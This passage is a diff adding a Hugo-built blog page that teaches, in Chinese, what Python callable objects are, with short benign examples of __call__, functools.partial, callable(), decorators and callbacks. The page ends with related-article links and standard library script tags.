+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">class Adder:
+</span></span><span class="line"><span class="cl">    def __init__(self, x):
+</span></span><span class="line"><span class="cl">        self.x = x
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def __call__(self, y):
+</span></span><span class="line"><span class="cl">        return self.x + y
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">add_5 = Adder(5)
+</span></span><span class="line"><span class="cl">print(add_5(3))  # 输出 8（等价于 add_5.__call__(3)）
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="5-其他内置可调用对象"><strong>(5) 其他内置可调用对象</strong>
+</h4><ul>
+<li>
+<p>生成器函数、部分函数（</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">functools</span><span class="o">.</span><span class="n">partial</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>）等。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">functools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">power</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="nb">exp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base</span> <span class="o">**</span> <span class="nb">exp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">square</span> <span class="o">=</span> <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">power</span><span class="p">,</span> <span class="nb">exp</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># 部分函数</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">square</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>  <span class="c1"># 输出 9</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<hr>
+<h3 id="2-如何判断一个对象是否可调用"><strong>2. 如何判断一个对象是否可调用？</strong>
+</h3><p>使用内置函数 <code>callable()</code> 可以检测对象是否可调用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">print(callable(len))        # True（内置函数）
+</span></span><span class="line"><span class="cl">print(callable(&#34;hello&#34;))    # False（字符串不可调用）
+</span></span><span class="line"><span class="cl">print(callable(Adder(5)))   # True（实现了 __call__ 的实例）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h3 id="3-不可调用的对象示例"><strong>3. 不可调用的对象示例</strong>
+</h3><ul>
+<li>
+<p><strong>基础数据类型</strong>：整数、字符串、列表等。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">x = 42
+</span></span><span class="line"><span class="cl">x()  # 报错：&#39;int&#39; object is not callable
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>未实现 <code>__call__</code> 的实例</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">class Cat:
+</span></span><span class="line"><span class="cl">    pass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">my_cat = Cat()
+</span></span><span class="line"><span class="cl">my_cat()  # 报错：&#39;Cat&#39; object is not callable
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<hr>
+<h3 id="4-callable-的实际应用场景"><strong>4. Callable 的实际应用场景</strong>
+</h3><ol>
+<li>
+<p><strong>装饰器（Decorator）</strong>：</p>
+<ul>
+<li>
+<p>装饰器本身必须是可调用对象（函数或类）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">def logger(func):
+</span></span><span class="line"><span class="cl">    def wrapper(*args, **kwargs):
+</span></span><span class="line"><span class="cl">        print(f&#34;Calling {func.__name__}&#34;)
+</span></span><span class="line"><span class="cl">        return func(*args, **kwargs)
+</span></span><span class="line"><span class="cl">    return wrapper
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@logger
+</span></span><span class="line"><span class="cl">def say_hello():
+</span></span><span class="line"><span class="cl">    print(&#34;Hello!&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">say_hello()  # 输出 &#34;Calling say_hello&#34; 和 &#34;Hello!&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p><strong>动态调用函数</strong>：</p>
+<ul>
+<li>
+<p>通过变量名动态调用函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">def do_operation(op, a, b):
+</span></span><span class="line"><span class="cl">    operations = {&#34;add&#34;: lambda x, y: x + y, &#34;mul&#34;: lambda x, y: x * y}
+</span></span><span class="line"><span class="cl">    return operations[op](a, b)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(do_operation(&#34;add&#34;, 3, 5))  # 输出 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p><strong>回调机制</strong>：</p>
+<ul>
+<li>
+<p>将函数作为参数传递，在特定事件发生时调用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">def on_button_click(callback):
+</span></span><span class="line"><span class="cl">    print(&#34;按钮被点击了！&#34;)
+</span></span><span class="line"><span class="cl">    callback()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def show_message():
+</span></span><span class="line"><span class="cl">    print(&#34;执行回调函数&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">on_button_click(show_message)
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="总结"><strong>总结</strong>
+</h3><ul>
+<li><strong>可调用对象</strong>是 Python 的核心概念之一，包括函数、类、方法和实现了 <code>__call__</code> 的实例。</li>
+<li>使用 <code>callable()</code> 可以快速检测对象是否可调用。</li>
+<li>理解 callable 是掌握装饰器、动态编程和回调机制的关键。</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">原型链污染</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Python沙箱逃逸</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/rcexss/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE，XSS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/test-chinese/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NoSQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
